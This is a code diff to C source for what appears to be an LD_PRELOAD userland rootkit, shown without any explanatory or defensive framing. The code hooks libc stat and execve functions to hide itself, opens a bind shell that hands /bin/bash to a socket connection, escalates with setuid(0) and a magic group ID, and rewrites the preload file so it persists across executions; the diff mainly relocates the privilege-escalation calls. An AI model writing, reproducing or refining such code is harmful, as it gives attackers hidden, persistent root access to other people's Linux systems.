@@ -32,15 +32,13 @@ static int (*old_lxstat)(int, const char *, struct stat *) = NULL;
 static int (*old_lxstat64)(int, const char *, struct stat64 *) = NULL;
 static int (*old_xstat)(int, const char *, struct stat *) = NULL;
 static int (*old_xstat64)(int, const char *, struct stat64 *) = NULL;
-static int (*old_puts)(const char *);
+static int (*old_puts)(const char *) = NULL;
 
 
 void IPv4() {
     int sockfd;
     pid_t pid;
     
-    setuid(0);
-    setgid(MAGIC_GID);
     if((pid = fork()) == 0) {
         if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
         struct sockaddr_in server, client;
@@ -58,6 +56,8 @@ void IPv4() {
         for(int i = 0; i < 3; i++) dup2(sockfd, i);
         if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");
 
+        setuid(0);
+        setgid(MAGIC_GID);
         old_execve("/bin/bash", NULL, NULL);
         close(sockfd);
         exit(0x0);
@@ -169,11 +169,11 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
     if(strstr(path, LD_LIBRARY) != NULL) {
         if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
         if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen");
+        setuid(0);
         FILE *ld_preload;        
 
         old_unlink(PRELOAD_PATH);
         old_execve(path, argv, envp);
-        setuid(0);
         ld_preload = old_fopen(PRELOAD_PATH, "w");
         fwrite(MAGIC_PATH, strlen(MAGIC_PATH), 1, ld_preload);
         fclose(ld_preload);
@@ -333,7 +333,6 @@ int __fxstat(int ver, int fd, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_fxstat == NULL) old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_fxstat(ver, fd, &tmp_stat);
 
@@ -349,7 +348,6 @@ int __fxstat64(int ver, int fd, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_fxstat64(ver, fd, &tmp_stat);
 
@@ -365,7 +363,6 @@ int __lxstat(int ver, const char *path, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_lxstat(ver, path, &tmp_stat);
 
@@ -381,7 +378,6 @@ int __lxstat64(int ver, const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_lxstat64(ver, path, &tmp_stat);
 
@@ -397,7 +393,6 @@ int __xstat(int ver, const char *path, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_xstat(ver, path, &tmp_stat);
 
@@ -413,7 +408,6 @@ int __xstat64(int ver, const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_xstat64(ver, path, &tmp_stat);
 
@@ -429,7 +423,6 @@ int fstat(int fd, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_fxstat == NULL) old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_fxstat(3, fd, &tmp_stat);
     
@@ -445,7 +438,6 @@ int fstat64(int fd, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_fxstat64(3, fd, &tmp_stat);
 
@@ -461,7 +453,6 @@ int lstat(const char *path, struct stat *buf) {
     struct stat tmp_stat;
     
     if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_lxstat(3, path, &tmp_stat);
 
@@ -477,7 +468,6 @@ int lstat64(const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_lxstat64(3, path, &tmp_stat);
 
@@ -493,7 +483,6 @@ int stat(const char *path, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_xstat(3, path, &tmp_stat);
 
@@ -509,7 +498,6 @@ int stat64(const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
-    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_xstat64(3, path, &tmp_stat);
 
